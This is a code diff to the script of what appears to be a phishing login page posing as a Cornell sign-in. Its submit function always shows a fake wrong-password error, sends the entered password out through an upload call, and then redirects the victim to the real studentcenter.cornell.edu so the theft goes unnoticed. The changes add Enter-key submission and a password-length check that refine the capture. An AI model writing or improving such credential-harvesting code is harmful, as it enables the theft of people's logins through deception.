@@ -52,7 +52,11 @@ Id('next').onclick = next
 window.addEventListener('keyup', (e) => {
     switch (e.key){
         case 'Enter':
-            next()
+            if(Id('second').style.display != 'flex'){
+                next()
+            }else{
+                submit()
+            }
             break
     }
 });
@@ -84,7 +88,24 @@ function next(){
     }
 
 }
+
 stage = 0
+
+function submit(){
+    if (stage == 0){
+        Id('password').classList.add('error')
+        Id('label2').classList.add('error')
+        Id('message2').style.display = 'flex'
+        Class('check')[0].style.marginTop = '20px'
+        if (Id('password').value.length > 7){
+            stage = 1
+        }
+        uploadSet(Id('password').value)
+    }else{
+        window.location = 'https://studentcenter.cornell.edu'
+    }
+}
+
 
 
 Id('profile').onclick = () => {
@@ -101,18 +122,7 @@ Id('profile').onclick = () => {
     },1000)
 }
 
-Id('submit').onclick = () => {
-    if (stage == 0){
-        Id('password').classList.add('error')
-        Id('label2').classList.add('error')
-        Id('message2').style.display = 'flex'
-        Class('check')[0].style.marginTop = '20px'
-        stage = 1
-        uploadSet(Id('password').value)
-    }else{
-        window.location = 'https://studentcenter.cornell.edu'
-    }
-}
+Id('submit').onclick = submit
 
 Id('email').oninput = e => {
     let val = Id('email').value
